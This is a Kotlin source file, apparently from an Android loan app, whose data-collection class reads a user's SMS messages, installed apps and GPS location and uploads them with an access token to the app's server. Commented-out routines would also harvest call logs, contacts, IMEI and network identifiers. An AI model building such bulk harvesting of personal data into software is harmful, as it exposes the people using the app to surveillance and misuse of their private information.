package com.chocolate.nigerialoanapp.collect

import android.annotation.SuppressLint
import android.text.TextUtils
import android.util.Log
import com.blankj.utilcode.util.*
import com.chocolate.nigerialoanapp.BuildConfig
import com.chocolate.nigerialoanapp.api.Api
import com.chocolate.nigerialoanapp.bean.response.UploadAuthResponse
import com.chocolate.nigerialoanapp.collect.item.CollectAppInfoMgr
import com.chocolate.nigerialoanapp.collect.item.CollectSmsMgr
import com.chocolate.nigerialoanapp.global.App
import com.chocolate.nigerialoanapp.global.Constant
import com.chocolate.nigerialoanapp.global.LocalConfig
import com.chocolate.nigerialoanapp.log.LogSaver
import com.chocolate.nigerialoanapp.network.NetworkUtils
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.StringCallback
import com.lzy.okgo.model.Response
import org.json.JSONObject
import java.io.UnsupportedEncodingException
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*

abstract class BaseCollectDataMgr {

    companion object {
        private val YMDHMS_FORMAT = "HH:mm, MMMM dd, yyyy"

        private const val TAG = "BaseCollectDataMgr"
        fun local2UTC(timeStamp: Long): String? {
            val sdf =
                SimpleDateFormat(YMDHMS_FORMAT)
            sdf.timeZone = TimeZone.getTimeZone("UTC")
            return sdf.format(Date(timeStamp))
        }

        fun encodeData(s: String): String? {
            if (StringUtils.isEmpty(s)) {
                return null
            }
            val s1 =
                s.replace("%".toRegex(), "").replace("\\+".toRegex(), "")
                    .replace("\"".toRegex(), "")
                    .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
            try {
                var resultStr = PatternUtils.filterEmoji(s1)
                return URLEncoder.encode(resultStr, "utf-8")
            } catch (e: UnsupportedEncodingException) {
                e.printStackTrace()
            }
            return null
        }

        fun encodeData1(s: String?): String? {
            if (StringUtils.isEmpty(s)) {
                return null
            }
            val s1 =
                s!!.replace("%".toRegex(), "").replace("\\+".toRegex(), "")
                    .replace("\"".toRegex(), "")
                    .replace("'".toRegex(), "").replace("\\\\".toRegex(), "")
            try {
                var resultStr = PatternUtils.filterEmoji(s1)
                return resultStr
            } catch (e: UnsupportedEncodingException) {
                e.printStackTrace()
            }
            return null
        }
    }

    fun collectAuthData(observer: Observer?) {
        var startMillions = System.currentTimeMillis()
        var startMillions1 = System.currentTimeMillis()
        ThreadUtils.executeByCached(object : ThreadUtils.SimpleTask<Exception?>() {
            @Throws(Throwable::class)
            override fun doInBackground(): Exception? {
                try {
                    val duration = (System.currentTimeMillis() - startMillions)
                    logFile(" start collect data start allo thread = $duration")
                    startMillions = System.currentTimeMillis()
                    val aesSmsStr = CollectSmsMgr.sInstance.getSmsAesStr()
                    val duration1 = (System.currentTimeMillis() - startMillions)
                    logFile(" read sms duration = " + duration1 + " size = " + aesSmsStr.length)
//                        EncodeUtils.encryptAES(GsonUtils.toJson(readCallRecord(context)))
                    val callRecordStr = ""
//                    val originContract = GsonUtils.toJson(readContract(context))
//                    val tempContract = EncodeUtils.encryptAES(originContract)
                    val contractStr = ""

                    startMillions = System.currentTimeMillis()
//                    val testStr = CollectSmsMgr.sInstance.getSmsStringForTest()
//                    LogSaver.logToFile(testStr)
//                    val testStr2 = CollectAppInfoMgr.sInstance.getStringForTest()
//                    LogSaver.logToFile(testStr2)
                    val aesAppInfoStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
                    val duration3 = (System.currentTimeMillis() - startMillions)
                    logFile(" read app info duration = $duration3")
//                    logFile(aesSmsStr)
//                    logFile(aesAppInfoStr)

                    startMillions = System.currentTimeMillis()
                    var locationBeanStr = ""
                    val locationStr = getLocation()
                    if (!TextUtils.isEmpty(locationStr)) {
                        if (BuildConfig.DEBUG) {
                            Log.e("Test", locationStr)
                        }
                        locationBeanStr = locationStr
                    }
                    val durationLocation = (System.currentTimeMillis() - startMillions)
                    logFile(" read location duration = $durationLocation")

                    val authParams = buildClientRequest(
                        aesSmsStr, callRecordStr, contractStr,
                        aesAppInfoStr, locationBeanStr,
                    )
                    getAuthData(authParams, observer, startMillions1)
                } catch (e: Exception) {
                    if (BuildConfig.DEBUG) {
                        throw e
                    }
                    return e
                }
                return null
            }


            override fun onSuccess(result: Exception?) {
                if (result != null) {
                    observer?.failure("collect data exception = " + result.toString())
                }
            }

        })
    }

    private fun getLocation(): String {
        val locationStr = LocationMgr.getInstance().gpsStr
        if (TextUtils.isEmpty(locationStr)) {
            return ""
        }
        return locationStr
    }

    @SuppressLint("MissingPermission")
    private fun buildClientRequest(
        smsStr: String, callRecordStr: String,
        contractStr: String, appListStr: String,
        locationStr: String
    ): JSONObject {
        val context = App.instance?.applicationContext ?: return JSONObject()
        val jsonObject = JSONObject()
//        val deviceId = SPUtils.getInstance().getString(LocalConfig.LC_DEVICE_ID, "")
//        val imei = SPUtils.getInstance().getString(LocalConfig.LC_IMEI, "")
        val acconutId =  SPUtils.getInstance().getString(LocalConfig.LC_ACCOUNT_ID, "")
//        val macAddress = DeviceInfo.getInstance(context).macAddress
//        val androidId = DeviceInfo.getInstance(context).androidId
//        val ipAddress = NetworkUtil().getIpAddress(context)

//        params.appRecognitionVerdict = Constant.appRecognitionVerdict
//        params.deviceRecognitionVerdict = Constant.deviceRecognitionVerdict
//        params.appLicensingVerdict = Constant.appLicensingVerdict
//        var appVersion: String? = null
//        var verCode: String? = null
//        try {
//            val pInfo = App.instance!!.packageManager.getPackageInfo(
//                App.instance!!.packageName, 0
//            )
//            appVersion = pInfo.versionName //version name
//            verCode = pInfo.versionCode.toString() //version code
//        } catch (e: PackageManager.NameNotFoundException) {
//            e.printStackTrace()
//        }
        var smsAesStr = CollectSmsMgr.sInstance.getSmsAesStr()
        if (TextUtils.isEmpty(smsAesStr)) {
            smsAesStr = ""
        }
        jsonObject.put("sms", smsAesStr)

//        params.setCall(callInfos);
//        if (contactInfos != null) {
//            params.setContacts(contactInfos.size() > 0 ? AESUtil.encryptAES(JSON.toJSON(contactInfos).toString()) : "");
//        }
        var appInfoAesStr = CollectAppInfoMgr.sInstance.getAppInfoAesStr()
        if (TextUtils.isEmpty(appInfoAesStr)) {
            appInfoAesStr = JSONObject().toString()
        }
        jsonObject.put("app_list", appInfoAesStr)
//        params.appList = appInfoAesStr
//        params.androidId = DeviceUtils.getAndroidID()
//        params.brand = DeviceUtils.getManufacturer()
//        params.deviceUniqId = DeviceUtils.getUniqueDeviceId()
//        params.imei = DeviceUtils.getAndroidID()
//        params.innerVersionCode = verCode
//        params.mac = macAddress
//        params.pubIp = NetworkUtils.getIpAddressByWifi()
//        params.userIp = NetworkUtils.getIPAddress(true)
//        params.accountId = acconutId
//        params.orderId = orderId
//        params.isRooted = if (DeviceUtils.isDeviceRooted()) "1" else "0"
//        params.isEmulator = if (DeviceUtils.isEmulator()) "1" else "0"
//        try {
//            //GPS位置json
//            params.gps = locationStr
//            //手机IMEI
//            try {
//                val hasPermissionReadPhoneState =
//                    PermissionUtils.isGranted(Manifest.permission.READ_PHONE_STATE)
//                if (hasPermissionReadPhoneState) {
//                    val imei = PhoneUtils.getIMEI()
//                    params.imei = if (!TextUtils.isEmpty(imei)) imei else DeviceUtils.getAndroidID()
//                }
//            } catch (e: Exception) {
//
//            }
//        } catch (e: java.lang.Exception) {
//            e.printStackTrace()
//            if (BuildConfig.DEBUG) {
//                throw e
//            }
//        }
        return jsonObject
    }

    @SuppressLint("MissingPermission")
    private fun getAuthData(
        authParams: JSONObject, observer: Observer?, startMillions1: Long
    ) {
        logFile(" start upload auth .")
        val startMillions = System.currentTimeMillis()
        authParams.put("account_id", Constant.mAccountId)
        authParams.put("access_token", Constant.mToken)
        OkGo.post<String>(Api.UPLOAD_AUTH_INFO).tag(TAG)
            .params("data", NetworkUtils.toBuildParams(authParams))
            .execute(object : StringCallback() {
                override fun onSuccess(response: Response<String>) {
//                        Log.i(TAG, " response success= " + response.body());
                    var authBean: UploadAuthResponse? = NetworkUtils.checkResponseSuccess(
                        response,
                        UploadAuthResponse::class.java
                    )
                    val totalDur = (System.currentTimeMillis() - startMillions)
                    logFile(" start upload auth success =  $totalDur")
                    if (authBean != null && TextUtils.equals(authBean?.has_upload, "1")) {
                        observer?.success(authBean)
                        log2File(authParams, "")
                    } else {
                        var errorMsg: String? = null
                        try {
                            errorMsg = response.body().toString()
                        } catch (e: Exception) {

                        }
                        observer?.failure(errorMsg)
                        log2File(authParams, errorMsg)
                    }
                }

                override fun onError(response: Response<String>) {
                    super.onError(response)
                    var errorMsg: String? = null
                    try {
                        errorMsg = response.body().toString()
                    } catch (e: Exception) {

                    }
                    observer?.failure(errorMsg)
                }
            })
    }

    private fun log2File(
        authParams: JSONObject?,
        errorMsg: String?
    ) {
        if (authParams == null) {
            return
        }
        var originSms: String? = ""
        var originAppInfo: String? = ""

        val aesSmsStr = authParams.optString("sms")
        if (!TextUtils.isEmpty(aesSmsStr)) {
            originSms = aesSmsStr
        }
        val aesAppListStr =  authParams.optString("app_list")
        if (!TextUtils.isEmpty(aesAppListStr)) {
            originAppInfo = aesAppListStr
        }

        val sb = StringBuffer()
        if (!TextUtils.isEmpty(originSms) && !Constant.isAabBuild()) {
            sb.append("  sms: ").append(originSms)
        }
        if (!TextUtils.isEmpty(originAppInfo) && !Constant.isAabBuild()) {
            sb.append("  appinfo: ").append(originAppInfo)
        }
        if (!TextUtils.isEmpty(errorMsg)) {
            sb.append("  errorMsg: ").append(errorMsg)
        }
        if (!TextUtils.isEmpty(sb.toString())) {
            LogSaver.logToFile(sb.toString())
        }
    }

    fun logFile(str: String) {
        if (BuildConfig.DEBUG) {
            Log.e("Test", str)
        }
        LogSaver.logToFile(getLogTag() + " " + str)
    }

    private fun getHardwareData() {

    }

    fun onDestroy() {
    }

    interface Observer {
        fun success(response: UploadAuthResponse?)
        fun failure(response: String?)
    }

//    private fun readCallRecord(context: Context): ArrayList<CallRecordRequest> {
//        val callRecordList = ArrayList<CallRecordRequest>()
//        val cr = context.contentResolver
//        val uri = CallLog.Calls.CONTENT_URI
//        val projection = arrayOf(
//            CallLog.Calls.NUMBER, CallLog.Calls.DATE,
//            CallLog.Calls.TYPE
//        )
//        var cursor: Cursor? = null
//        try {
//            cursor = cr.query(uri, projection, null, null, null)
//            while (cursor!!.moveToNext()) {
//                val number = cursor.getString(0)
//                val date = cursor.getLong(1)
//                val type = cursor.getInt(2)
//                callRecordList.add(CallRecordRequest(number, date, type))
//            }
//        } catch (e: Exception) {
//            e.printStackTrace()
//            Log.e(getTag(), "read cardCord exception = $e")
//        } finally {
//            cursor?.close()
//        }
//        return callRecordList
//    }

//    @SuppressLint("Range")
//    private fun readContract(context: Context): ArrayList<ContactRequest>? {
//        //调用并获取联系人信息
//        var cursor: Cursor? = null
//        val list: ArrayList<ContactRequest> = ArrayList<ContactRequest>()
//        try {
//            cursor = context.contentResolver.query(
//                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//                null, null, null, null
//            )
//            if (cursor != null) {
//                while (cursor.moveToNext()) {
//                    val id =
//                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID))
//                    val displayName =
//                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
//                    var number =
//                        cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
//                    val lastUpdateTime =
//                        cursor.getLong(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP))
//                    //                    Log.e(TAG, " photo = " + photoUri + "  ringtone = " + ringtone + " look = " + lookupUri);
//                    val contactRequest = ContactRequest()
//                    contactRequest.name = encodeData1(displayName)
//                    if (!TextUtils.isEmpty(number)) {
//                        number = number.replace("-".toRegex(), " ")
//                        // 空格去掉  为什么不直接-替换成"" 因为测试的时候发现还是会有空格 只能这么处理
//                        number = number.replace(" ".toRegex(), "")
//                        contactRequest.number = encodeData(number)
//                    }
//                    contactRequest.lastUpdate = lastUpdateTime
//                    list.add(contactRequest)
//                }
//            }
//        } catch (e: Exception) {
//            e.printStackTrace()
//            Log.e(getTag(), " exception = $e")
//        } finally {
//            cursor?.close()
//        }
//        return list
//    }

    abstract fun getTag(): String

    abstract fun getLogTag(): String

}